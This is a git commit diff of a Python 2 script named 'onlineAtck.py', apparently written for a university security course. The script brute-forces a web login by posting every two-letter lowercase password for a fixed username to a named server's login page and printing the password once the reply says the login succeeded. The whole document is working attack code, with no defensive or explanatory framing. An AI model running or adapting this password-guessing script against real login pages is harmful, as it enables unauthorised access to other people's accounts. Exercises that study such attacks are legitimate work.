b32b404831298825baa4e8f0cfd64354988c5cf3
ralvarez14 <ralvarezmoreno99@gmail.com>
2018-02-14 14:38:54 -0700

    Add files via upload

--- onlineAtck.py
+++ onlineAtck.py
@@ -1,22 +1,26 @@
 import urllib
 import urllib2
 import itertools
-from cookielib import CookieJar
+import cookielib 
+import re
 
-lower = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
+ls=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
 
-cJar = CookieJar()
-openThis = urllib2.build_opener(urllib2.HTTPCookieProcessor(cJar))
-username = "jonathan1_-KnS"
-password = 
-for i in range(2,3):
-    for j in itertools.product(lower,repeat=i):
-        pasw = ''.join(j)
-
-        params = urllib.urlencode({"", pasw})
-
-        request = openThis.open("https://cs5339.cs.utep.edu/longpre/loginScreen.php",urllib.urlencode(params))
-        respond = urllib2.urlopen(request)
-
-        if(respond.read().find("Was not successful") == -1):
-            print("password is: ",password)
+jar = cookielib.FileCookieJar("cookie")
+openThis = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
+url = "http://cs5339.cs.utep.edu/longpre/loginScreen.php"
+user = "jonathan1_-KnS"
+ 
+for i in range(2,3):                                    #Permutator for the combinations of letters
+    for j in itertools.product(ls,repeat=i):
+        pasw = ''.join(j)                               #Append letters
+        params = {"un":user,"pw":pasw}                  #Set user and password as parameters
+        params = urllib.urlencode(params)               #Encode parameters
+        login_request = urllib2.Request(url,params)     #Request conexion
+        login_reply = openThis.open(login_request)      #Open the request
+        login_reply_data = login_reply.read()           #read the reply data
+        reply_msg = re.compile("login was successful")  #Set desired messege
+        if(reply_msg.search(login_reply_data)):         #Search for desired messege
+           print "password is: ",pasw
+           break
+        
